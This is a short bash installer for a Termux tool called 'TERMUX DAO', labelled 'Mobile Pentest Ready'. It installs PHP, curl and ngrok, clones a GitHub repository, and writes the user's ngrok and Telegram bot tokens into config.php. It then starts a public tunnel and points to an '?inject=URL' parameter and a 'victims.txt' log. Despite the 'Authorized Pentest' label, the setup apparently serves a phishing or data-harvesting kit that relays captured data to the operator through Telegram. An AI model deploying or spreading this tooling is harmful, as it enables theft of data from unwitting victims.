#!/data/data/com.termux/files/usr/bin/bash
# 🔥 TERMUX DAO ONE-CLICK INSTALLER
# Non-root | Fully Working | Mobile Pentest Ready

echo "🔥 Installing TERMUX DAO... (Authorized Pentest)"

# Update + Dependencies
pkg update -y &>/dev/null
pkg install php curl git screen wget openssh -y &>/dev/null

# Clone + Setup
git clone https://github.com/AS-1483/termux-dao-oneclick.git dao
cd dao

# Permissions
chmod +x *.sh

# Auto-config (Get NGROK auth first)
echo "⚙️ Setup NGROK Auth (ngrok.com → Dashboard → Authtoken):"
read -p "NGROK_TOKEN: " NGROK_TOKEN
echo "ngrok authtoken $NGROK_TOKEN" >> setup.sh

echo "📝 Setup Telegram:"
read -p "BOT_TOKEN (@BotFather): " BOT_TOKEN
read -p "CHAT_ID (@userinfobot): " CHAT_ID

# Update config
sed -i "s/YOUR_BOT_TOKEN/$BOT_TOKEN/g" config.php
sed -i "s/YOUR_CHAT_ID/$CHAT_ID/g" config.php

echo "✅ DAO Installed! Starting..."
./start.sh

echo "🎯 URLs:"
echo "Main: https://\$(curl -s ngrok.log | grep ngrok.io)"
echo "Inject: ?inject=URL"
echo "Logs: tail -f victims.txt"
echo ""
echo "🛑 Stop: Ctrl+C | Restart: cd dao && ./start.sh"
echo "📱 Screen: screen -r dao"
